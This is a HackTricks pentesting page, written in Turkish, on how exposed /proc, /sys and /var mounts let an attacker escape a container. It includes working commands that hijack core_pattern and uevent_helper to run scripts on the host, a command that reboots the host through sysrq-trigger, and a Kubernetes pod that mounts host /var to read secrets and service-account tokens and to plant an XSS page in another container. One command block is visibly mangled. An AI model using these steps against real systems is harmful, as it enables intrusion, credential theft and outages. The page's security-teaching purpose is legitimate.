# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

`/proc`, `/sys` ve `/var`'ın uygun namespace izolasyonu olmadan açılması, saldırı yüzeyinin genişlemesi ve bilgi sızıntısı da dahil olmak üzere önemli güvenlik riskleri oluşturur. Bu dizinler, yanlış yapılandırıldığında veya yetkisiz bir kullanıcı tarafından erişildiğinde, konteyner kaçışı, ana makine değişikliği veya daha fazla saldırıyı destekleyen bilgilerin sağlanmasına yol açabilecek hassas dosyalar içerir. Örneğin, `-v /proc:/host/proc` yanlış bir şekilde monte edildiğinde, yol tabanlı doğası nedeniyle AppArmor korumasını atlayabilir ve `/host/proc`'u korumasız bırakabilir.

**Her potansiyel zafiyetin daha fazla detayını bulabilirsiniz** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Vulnerabilities

### `/proc/sys`

Bu dizin, genellikle `sysctl(2)` aracılığıyla çekirdek değişkenlerini değiştirme erişimi sağlar ve birkaç endişe verici alt dizin içerir:

#### **`/proc/sys/kernel/core_pattern`**

- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) içinde tanımlanmıştır.
- Çekirdek dosyası oluşturulduğunda çalıştırılacak bir program tanımlamaya izin verir; ilk 128 bayt argüman olarak kullanılır. Dosya bir boru `|` ile başlarsa, kod yürütmeye yol açabilir.
- **Test ve Sömürü Örneği**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Yazma erişimini test et
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Özel işleyici ayarla
sleep 5 && ./crash & # İşleyiciyi tetikle
```

#### **`/proc/sys/kernel/modprobe`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde detaylandırılmıştır.
- Çekirdek modül yükleyicisinin yolunu içerir, çekirdek modüllerini yüklemek için çağrılır.
- **Erişim Kontrolü Örneği**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobe erişimini kontrol et
```

#### **`/proc/sys/vm/panic_on_oom`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde referans verilmiştir.
- OOM durumu meydana geldiğinde çekirdeğin panik yapıp yapmayacağını kontrol eden bir global bayraktır.

#### **`/proc/sys/fs`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) gereğince, dosya sistemi hakkında seçenekler ve bilgiler içerir.
- Yazma erişimi, ana makineye karşı çeşitli hizmet reddi saldırılarını etkinleştirebilir.

#### **`/proc/sys/fs/binfmt_misc`**

- Sihirli numaralarına dayalı olarak yerel olmayan ikili formatlar için yorumlayıcıların kaydedilmesine izin verir.
- `/proc/sys/fs/binfmt_misc/register` yazılabilir olduğunda ayrıcalık yükselmesine veya root shell erişimine yol açabilir.
- İlgili sömürü ve açıklama:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Derinlemesine eğitim: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Diğerleri `/proc` içinde

#### **`/proc/config.gz`**

- `CONFIG_IKCONFIG_PROC` etkinse çekirdek yapılandırmasını açığa çıkarabilir.
- Saldırganlar için çalışan çekirdekteki zafiyetleri tanımlamak için yararlıdır.

#### **`/proc/sysrq-trigger`**

- Sysrq komutlarını çağırmaya izin verir, bu da hemen sistem yeniden başlatmalarına veya diğer kritik eylemlere neden olabilir.
- **Ana Makineyi Yeniden Başlatma Örneği**:

```bash
echo b > /proc/sysrq-trigger # Ana makineyi yeniden başlatır
```

#### **`/proc/kmsg`**

- Çekirdek halka tamponu mesajlarını açığa çıkarır.
- Çekirdek sömürülerine, adres sızıntılarına yardımcı olabilir ve hassas sistem bilgilerini sağlayabilir.

#### **`/proc/kallsyms`**

- Çekirdek tarafından dışa aktarılan sembolleri ve adreslerini listeler.
- KASLR'yi aşmak için çekirdek sömürü geliştirmede önemlidir.
- Adres bilgisi `kptr_restrict` 1 veya 2 olarak ayarlandığında kısıtlanır.
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) içinde detaylar.

#### **`/proc/[pid]/mem`**

- Çekirdek bellek cihazı `/dev/mem` ile arayüz sağlar.
- Tarihsel olarak ayrıcalık yükseltme saldırılarına karşı savunmasızdır.
- Daha fazla bilgi için [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Sistemin fiziksel belleğini ELF çekirdek formatında temsil eder.
- Okuma, ana makine ve diğer konteynerlerin bellek içeriklerini sızdırabilir.
- Büyük dosya boyutu okuma sorunlarına veya yazılım çökmesine yol açabilir.
- Detaylı kullanım için [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) bakınız.

#### **`/proc/kmem`**

- Çekirdek sanal belleğini temsil eden `/dev/kmem` için alternatif bir arayüzdür.
- Okuma ve yazma işlemlerine izin verir, dolayısıyla çekirdek belleğini doğrudan değiştirme imkanı sunar.

#### **`/proc/mem`**

- Fiziksel belleği temsil eden `/dev/mem` için alternatif bir arayüzdür.
- Okuma ve yazma işlemlerine izin verir, tüm belleği değiştirmek için sanal adreslerin fiziksel adreslere dönüştürülmesi gerekir.

#### **`/proc/sched_debug`**

- PID namespace korumalarını atlayarak süreç zamanlama bilgilerini döndürür.
- Süreç adlarını, kimliklerini ve cgroup tanımlayıcılarını açığa çıkarır.

#### **`/proc/[pid]/mountinfo`**

- Sürecin mount namespace'inde mount noktaları hakkında bilgi sağlar.
- Konteynerin `rootfs` veya görüntüsünün konumunu açığa çıkarır.

### `/sys` Vulnerabilities

#### **`/sys/kernel/uevent_helper`**

- Çekirdek cihaz `uevent`'lerini işlemek için kullanılır.
- `/sys/kernel/uevent_helper`'a yazmak, `uevent` tetikleyicileri üzerine rastgele betikler çalıştırabilir.
- **Sömürü Örneği**: %%%bash

#### Bir yük oluşturur

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Konteyner için OverlayFS montajından ana makine yolunu bulur

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### uevent_helper'ı kötü niyetli yardımcıya ayarlar

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Bir uevent tetikler

echo change > /sys/class/mem/null/uevent

#### Çıktıyı okur

cat /output %%%

#### **`/sys/class/thermal`**

- Sıcaklık ayarlarını kontrol eder, bu da DoS saldırılarına veya fiziksel hasara neden olabilir.

#### **`/sys/kernel/vmcoreinfo`**

- Çekirdek adreslerini sızdırır, bu da KASLR'yi tehlikeye atabilir.

#### **`/sys/kernel/security`**

- Linux Güvenlik Modüllerinin (AppArmor gibi) yapılandırılmasına izin veren `securityfs` arayüzünü barındırır.
- Erişim, bir konteynerin MAC sistemini devre dışı bırakmasına olanak tanıyabilir.

#### **`/sys/firmware/efi/vars` ve `/sys/firmware/efi/efivars`**

- NVRAM'daki EFI değişkenleri ile etkileşim kurmak için arayüzler açığa çıkarır.
- Yanlış yapılandırma veya sömürü, bozuk dizüstü bilgisayarlara veya önyüklenemez ana makinelerle sonuçlanabilir.

#### **`/sys/kernel/debug`**

- `debugfs`, çekirdeğe "kural yok" hata ayıklama arayüzü sunar.
- Kısıtlanmamış doğası nedeniyle güvenlik sorunları geçmişi vardır.

### `/var` Vulnerabilities

Ana makinenin **/var** klasörü, konteyner çalışma soketlerini ve konteynerlerin dosya sistemlerini içerir. Bu klasör bir konteyner içinde monte edilirse, o konteyner diğer konteynerlerin dosya sistemlerine root ayrıcalıklarıyla okuma-yazma erişimi alır. Bu, konteynerler arasında geçiş yapmak, hizmet reddi oluşturmak veya içinde çalışan diğer konteynerler ve uygulamalara arka kapı açmak için kötüye kullanılabilir.

#### Kubernetes

Eğer böyle bir konteyner Kubernetes ile dağıtılırsa:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
**pod-mounts-var-folder** konteynerinin içinde:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
XSS şu şekilde gerçekleştirildi:

![Mounted /var klasörü aracılığıyla Saklanan XSS](/images/stored-xss-via-mounted-var-folder.png)

Konteynerin bir yeniden başlatmaya veya başka bir şeye ihtiyaç duymadığını unutmayın. Mounted **/var** klasörü aracılığıyla yapılan herhangi bir değişiklik anında uygulanacaktır.

Ayrıca, otomatik (veya yarı otomatik) RCE elde etmek için yapılandırma dosyalarını, ikili dosyaları, hizmetleri, uygulama dosyalarını ve shell profillerini değiştirebilirsiniz.

##### Bulut kimlik bilgilerine erişim

Konteyner, K8s serviceaccount token'larını veya AWS webidentity token'larını okuyabilir, bu da konteynerin K8s veya buluta yetkisiz erişim elde etmesine olanak tanır.
```bash
/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
#### Docker

Docker'da (veya Docker Compose dağıtımlarında) istismar tam olarak aynıdır, tek fark genellikle diğer konteynerlerin dosya sistemlerinin farklı bir temel yol altında mevcut olmasıdır:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Bu nedenle dosya sistemleri `/var/lib/docker/overlay2/` altında bulunmaktadır:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Not

Gerçek yollar farklı kurulumlarda farklılık gösterebilir, bu yüzden en iyi seçeneğiniz diğer konteynerlerin dosya sistemlerini bulmak için **find** komutunu kullanmaktır.

### Referanslar

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
